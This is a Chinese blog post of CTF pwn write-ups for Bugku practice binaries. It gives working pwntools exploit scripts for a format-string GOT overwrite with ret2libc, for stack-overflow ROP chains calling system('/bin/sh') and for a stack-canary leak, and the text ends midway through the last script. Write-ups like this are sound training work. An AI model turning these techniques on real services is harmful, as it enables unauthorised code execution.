@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/1337222.jpeg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="no pwn,no fun">
+<meta property="og:type" content="website">
+<meta property="og:title" content="every little helps">
+<meta property="og:url" content="https://github.com/zaoganmaqule">
+<meta property="og:site_name" content="DA1SY&#39;s Blog">
+<meta property="og:description" content="no pwn,no fun">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/images/jxl31y.jpg">
+<meta property="article:published_time" content="2024-08-21T01:22:15.000Z">
+<meta property="article:modified_time" content="2024-08-21T15:38:45.476Z">
+<meta property="article:author" content="da1sy">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/images/jxl31y.jpg">
+
+
+<link rel="canonical" href="https://example.com/2024/08/21/bugku-ctf%E7%9A%84pwn%E9%A2%98%E8%A7%A3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://example.com/2024/08/21/bugku-ctf%E7%9A%84pwn%E9%A2%98%E8%A7%A3/","path":"2024/08/21/bugku-ctf的pwn题解/","title":"Bugku_CTF的pwn题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Bugku_CTF的pwn题解 | DA1SY's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">DA1SY's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Every little helps.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">11</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B9%8B%E5%89%8D%E4%BA%86%E8%A7%A3%E8%BF%99%E5%B9%B3%E5%8F%B0%EF%BC%8C%E5%A5%BD%E5%83%8F%E8%BF%98%E6%98%AF%E5%B8%88%E5%82%85%E4%BB%AC%E6%89%93AWD%E3%80%82%E5%B0%A4%E5%85%B6%E6%9C%AC%E4%BA%BA%E6%B2%A1%E6%89%93%E8%BF%87%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E8%AE%A8%E8%AE%BA%E6%9C%89%E6%9C%BA%E4%BC%9A%E5%92%8C%E5%B8%88%E5%82%85%E4%BB%AC%E4%B8%80%E8%B5%B7%E7%8E%A9%E3%80%82%E9%93%BE%E6%8E%A5%E5%A6%82%E4%B8%8Bhttps-ctf-bugku-com"><span class="nav-number">1.</span> <span class="nav-text">之前了解这平台，好像还是师傅们打AWD。尤其本人没打过，所以不讨论有机会和师傅们一起玩。链接如下https:&#x2F;&#x2F;ctf.bugku.com&#x2F;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80"><span class="nav-number">2.</span> <span class="nav-text">瑞士军刀</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#repeater"><span class="nav-number">3.</span> <span class="nav-text">repeater</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#overflow"><span class="nav-number">4.</span> <span class="nav-text">overflow</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Easy-int"><span class="nav-number"></span> <span class="nav-text">Easy_int</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#canary"><span class="nav-number">1.</span> <span class="nav-text">canary</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#overflow2"><span class="nav-number">2.</span> <span class="nav-text">overflow2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Baby-heap1"><span class="nav-number"></span> <span class="nav-text">Baby-heap1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#printf"><span class="nav-number">1.</span> <span class="nav-text">printf</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Baby-heap2"><span class="nav-number"></span> <span class="nav-text">Baby-heap2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#simple-storm"><span class="nav-number"></span> <span class="nav-text">simple_storm</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="da1sy"
+      src="/images/jxl31y.jpg">
+  <p class="site-author-name" itemprop="name">da1sy</p>
+  <div class="site-description" itemprop="description">no pwn_no fun</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zaoganmaqule" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zaoganmaqule" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:zheh7777@gmail.com" title="E-Mail → mailto:zheh7777@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://github.com/zaoganmaqule" title="https:&#x2F;&#x2F;github.com&#x2F;zaoganmaqule" rel="noopener" target="_blank">My github</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.csdn.net/has_zaoganmaqule?type=blog" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;has_zaoganmaqule?type&#x3D;blog" rel="noopener" target="_blank">My Blog</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2024/08/21/bugku-ctf%E7%9A%84pwn%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/jxl31y.jpg">
+      <meta itemprop="name" content="da1sy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DA1SY's Blog">
+      <meta itemprop="description" content="no pwn_no fun">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Bugku_CTF的pwn题解 | DA1SY's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Bugku_CTF的pwn题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-21 09:22:15" itemprop="dateCreated datePublished" datetime="2024-08-21T09:22:15+08:00">2024-08-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<h5 id="之前了解这平台，好像还是师傅们打AWD。尤其本人没打过，所以不讨论有机会和师傅们一起玩。链接如下https-ctf-bugku-com"><a href="#之前了解这平台，好像还是师傅们打AWD。尤其本人没打过，所以不讨论有机会和师傅们一起玩。链接如下https-ctf-bugku-com" class="headerlink" title="之前了解这平台，好像还是师傅们打AWD。尤其本人没打过，所以不讨论有机会和师傅们一起玩。链接如下https://ctf.bugku.com/"></a>之前了解这平台，好像还是师傅们打AWD。尤其本人没打过，所以不讨论有机会和师傅们一起玩。链接如下<a target="_blank" rel="noopener" href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></h5></blockquote>
+<h5 id="瑞士军刀"><a href="#瑞士军刀" class="headerlink" title="瑞士军刀"></a>瑞士军刀</h5><p>看名字就知道是nc，直接连。</p>
+<p><img src="https://s2.loli.net/2024/08/21/dv7yEY8jr1tbXM4.png" alt="5bf7dc71f56cc21887b825b604146ad.png"></p>
+<h5 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h5><p>这题就是简单的fmt+ret2libc，比较坑的是没给你libc。直接泄露栈上的地址，找不到对应的版本，所以就想着泄露puts，但是用到了%s来进行泄露。之后就是简单的修改got表</p>
+<p>检查保护</p>
+<p><img src="https://s2.loli.net/2024/08/21/BrXnAZ4WtfSkqGU.png" alt="1724203925407.png"></p>
+<p>可以修改got表</p>
+<p><img src="https://s2.loli.net/2024/08/21/f6cpzkCX3g25JKM.png" alt="1724204041564.png"></p>
+<p>无限次的格式化字符串漏洞。查看一波offset&#x3D;6</p>
+<p><img src="https://s2.loli.net/2024/08/21/Vc5yCiS89LWeNXU.png" alt="13d87bea363ec76b1894dfff32888c1.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">pl <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%6$s"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/L7shSJUb5rfZcIQ.png" alt="19f03a0c3977dc8c3c7b447d08b6c4f.png"></p>
+<p>为什么用s呢，因为%p是打印该指针地址，%s是直接打印字符串，只要不遇到字符串终结符他就不会停止。依次还会打印出来,可以看到它打印出来了puts_got表和表里面的内容，以及下面的__libc_start_main,putchar@plt+6</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x10 bytes:
+    00000000  <span class="token number">18</span> a0 04 08  <span class="token number">80</span> e0 de f7  a0 cc d9 f7  <span class="token number">36</span> <span class="token number">84</span> 04 08  │····│····│····│6···│
+    00000010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/25coKgix3CkEaSH.png" alt="d52084820d10da08e49d5cd37714704.png"></p>
+<p>然后就是正常的修改got表</p>
+<p><img src="https://s2.loli.net/2024/08/21/nsXqY6t8BDaj2zO.png" alt="00b5e39edc410870d31b9cfffd7e451.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+    printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
+    ru<span class="token punctuation">(</span><span class="token string">" repeater?\n"</span><span class="token punctuation">)</span>
+
+    pl <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%6$s"</span>
+    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+    
+    puts <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
+    lg<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>
+
+    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>
+    libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
+
+    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
+    offset <span class="token operator">=</span> <span class="token number">6</span>
+    pl <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token punctuation">&#123;</span>printf_got<span class="token punctuation">:</span>system<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+    s<span class="token punctuation">(</span><span class="token string">"/bin/bash\00"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># gdb()</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h5><p>顾名思义，溢出。</p>
+<p><img src="https://s2.loli.net/2024/08/21/THjZoArRIp6X5Dv.png" alt="1724204617919.png"></p>
+<p>有后门，栈溢出。</p>
+<p>检查保护</p>
+<p><img src="https://s2.loli.net/2024/08/21/yfHwDvtOz56AWMT.png" alt="1724204681500.png"></p>
+<p>打法很多。shellcode也可以，用backdoor也可以</p>
+<p><img src="https://s2.loli.net/2024/08/21/OtAzYbRd6xueEXN.png" alt="1724204920275.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    backdoor <span class="token operator">=</span> <span class="token number">0x400751</span>
+    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
+    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Easy-int"><a href="#Easy-int" class="headerlink" title="Easy_int"></a>Easy_int</h4><p>他的这个保护我看着都比较陌生了。</p>
+<p><img src="https://s2.loli.net/2024/08/21/cNJjXLnb45Eoufs.png" alt="1724205279658.png"></p>
+<p>看看源码，上来就是一个知识点题，让你输入一个数NUM，且NUM和-NUM都要是负数。这就是机组的知识了，int表示范围是-2147483648~2147483647，我输入-2147483648的时候，他在数轴的正半轴没有对应的数，所以还是负数。</p>
+<p><img src="https://s2.loli.net/2024/08/21/1rItJnXQ6gN7p3D.png" alt="1724205471521.png"></p>
+<p>查看字符表有system和sh。在找一个pop rdi的gadget，还有一个ret用于栈对齐</p>
+<p><img src="https://s2.loli.net/2024/08/21/chukqXD5Ax2a1rO.png" alt="1724205646757.png"></p>
+<p><img src="https://s2.loli.net/2024/08/21/5M8Tqw2CBcIb14V.png" alt="1724205698995.png"></p>
+<p>最后getshell</p>
+<p><img src="https://s2.loli.net/2024/08/21/uBb5AWHszetFo9Q.png" alt="1724205902355.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    ru<span class="token punctuation">(</span><span class="token string">"Input your int:\n"</span><span class="token punctuation">)</span>
+    sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>
+
+    pop_rdi <span class="token operator">=</span> <span class="token number">0x0401343</span>
+    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
+    sh <span class="token operator">=</span> <span class="token number">0x403500</span>
+    system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+
+    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"Congratulations!\n"</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h5><p>顾名思义肯定是为了得到canary。可以利用%s将canary打印出来。与上一题一样都给了system和sh</p>
+<p><img src="https://s2.loli.net/2024/08/21/NX8Jw5kOpynhTHE.png" alt="1724206036201.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">ru<span class="token punctuation">(</span><span class="token string">"Please leave your name(Within 36 Length):"</span><span class="token punctuation">)</span>
+    pl <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span>
+    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span> <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
+    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\x00"</span> <span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span><span class="token comment">#泄露canary</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/pTBjNgJ9d4ViF5U.png" alt="1724207168798.png"></p>
+<p>最后getshell</p>
+<p><img src="https://s2.loli.net/2024/08/21/czUTGOvRpXs175S.png" alt="1724207134737.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    ru<span class="token punctuation">(</span><span class="token string">"Please leave your name(Within 36 Length):"</span><span class="token punctuation">)</span>
+    pl <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span>
+    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span> <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
+    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\x00"</span> <span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>
+
+    system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
+    sh <span class="token operator">=</span> <span class="token number">0x601068</span>
+    ret <span class="token operator">=</span> <span class="token number">0x0400611</span>
+    pop_rdi <span class="token operator">=</span> <span class="token number">0x400963</span>
+
+    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"Please leave a message(Within 0x200 Length):"</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="overflow2"><a href="#overflow2" class="headerlink" title="overflow2"></a>overflow2</h5><p>这题和前面两题一样给了system和sh、栈溢出，直接打。</p>
+<p><img src="https://s2.loli.net/2024/08/21/LpoWQIHrO6yKZCM.png" alt="1724207631255.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+    sh <span class="token operator">=</span> <span class="token number">0x402004</span>
+    pop_rdi <span class="token operator">=</span> <span class="token number">0x040126b</span>
+    ret <span class="token operator">=</span> <span class="token number">0x401016</span>
+
+    ru<span class="token punctuation">(</span><span class="token string">" your name.\n"</span><span class="token punctuation">)</span>
+    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
